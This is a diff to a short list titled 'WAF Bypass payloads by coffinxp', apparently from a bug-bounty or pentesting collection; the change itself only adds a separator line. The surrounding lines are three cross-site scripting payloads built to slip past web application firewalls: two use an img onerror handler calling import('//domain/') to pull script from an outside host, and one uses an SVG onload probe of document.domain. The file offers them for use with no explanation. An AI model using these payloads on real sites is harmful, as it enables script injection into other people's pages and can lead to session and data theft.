@@ -1,4 +1,5 @@
 WAF Bypass payloads by coffinxp
+-----------------------------------
 "><img/src/onerror=import('//domain/')>"@yourdomain
 013371337;ext=<img/src/onerror=import('//domain/')>
 <Svg Only=1 OnLoad=confirm(document.domain)>
